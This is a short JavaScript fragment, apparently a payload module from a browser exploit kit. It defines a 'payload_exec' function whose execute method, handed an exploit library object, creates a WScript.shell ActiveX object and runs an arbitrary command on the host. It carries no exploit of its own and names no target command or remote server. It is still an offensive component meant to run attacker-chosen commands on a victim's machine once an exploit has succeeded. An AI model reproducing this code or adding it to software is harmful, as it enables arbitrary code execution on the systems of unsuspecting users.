function payload_exec(cmd) {

	this.execute = function(explib) {

		var WshShell = new ActiveXObject("WScript.shell");
		var oExec = WshShell.Exec(cmd);
	}

	return this;
}
